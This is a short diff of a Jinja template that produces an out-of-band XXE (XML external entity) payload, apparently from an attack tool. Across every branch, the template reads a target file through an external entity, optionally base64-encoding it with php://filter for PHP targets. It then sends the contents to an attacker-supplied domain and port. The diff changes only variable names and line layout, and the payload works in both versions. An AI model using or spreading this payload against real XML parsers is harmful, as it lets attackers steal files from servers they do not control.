@@ -1,11 +1,7 @@
-{% if file.lang.java %}
-<!ENTITY % file SYSTEM "{{ url }}">
+{% if file.lang.java %}<!ENTITY % file SYSTEM "{{ file.url }}">
 {% elif file.lang.php %}
-{% if file.base64 %}
-<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource={{ url }}">
-{% else %}
-<!ENTITY % file SYSTEM "{{ url }}">
+{% if file.base64 %}<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource={{ file.url }}">
+{% else %}<!ENTITY % file SYSTEM "{{ file.url }}">
 {% endif %}
-{% endif %}
-<!ENTITY % all "<!ENTITY xxe SYSTEM 'http://{{ domain }}:{{ port }}/?%file;'>">
+{% endif %}<!ENTITY % all "<!ENTITY xxe SYSTEM 'http://{{ file.domain }}:{{ file.port }}/?%file;'>">
 %all;
